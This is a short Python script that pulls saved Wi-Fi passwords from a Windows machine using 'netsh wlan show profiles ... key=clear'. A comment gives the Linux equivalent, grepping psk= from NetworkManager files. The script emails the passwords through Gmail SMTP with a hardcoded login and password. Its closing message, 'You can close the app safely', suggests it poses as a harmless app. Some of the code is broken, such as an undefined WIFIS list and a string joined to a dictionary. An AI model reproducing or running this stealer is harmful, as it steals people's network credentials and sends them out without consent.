def WFPS():
    #sudo grep psk= /etc/NetworkManager/system-connections/*
    try:
        dic={}
        for wifi in WIFIS:
            a=subprocess.getoutput(f'netsh wlan show profiles {wifi} key=clear')
            try:
                new=re.search(r'Key Content.*',a)
                new=new.group()
                new= new[new.index(':')+2:]
                dic[wifi]=new
            except: dic[wifi]='None'     
        if len(dic):
            print('WPG:Done')
            return (dic)
        else: print('WP:Error (404)')
    except: print('WP:Error (Unknown)')
RET= WFPS()


import smtplib 
s = smtplib.SMTP('smtp.gmail.com', 587) 
s.starttls() 
s.login("rawmin.rx@gmail.com", "askaramp.r.e") 
message = RET if RET else 'None'
s.sendmail("rawmin.rx@gmail.com", "raminj.rx7@gmail.com", str('WIFIPASSWORDS:\n'+message)) 
s.quit()
print('WPE:Done')
import os
try: os.remove('null')
except: pass
print('You can close the app safely')

